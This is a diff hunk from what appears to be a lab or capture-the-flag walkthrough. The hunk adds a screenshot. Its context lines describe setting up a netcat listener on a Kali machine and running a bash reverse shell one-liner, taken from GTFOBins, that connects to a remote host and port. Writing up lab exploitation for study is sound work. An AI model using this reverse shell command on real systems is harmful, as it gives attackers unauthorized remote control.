@@ -40,6 +40,9 @@ Within the directories given, I was also directed to a login page. If you explor
 
 
 
+<img width="1440" alt="Screen Shot 2022-11-12 at 2 01 50 PM" src="https://user-images.githubusercontent.com/117850176/201499359-26a72db9-c722-401b-8bbd-507be2774f0f.png">
+
+
 After seeing that a command line was given, I decided to host a netcat listener on my local kali machine on port 1234. I used this port because I knew nothing would be communicating on it. The exact command that I used will be provided via the chaeatsheet.11 Netcat is a command for reading and writing data between two computers. Next, I used a bash reverse shell command that I found on gtfobins, since I found this on a third party site, I will provide the command here. 
 - bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
 
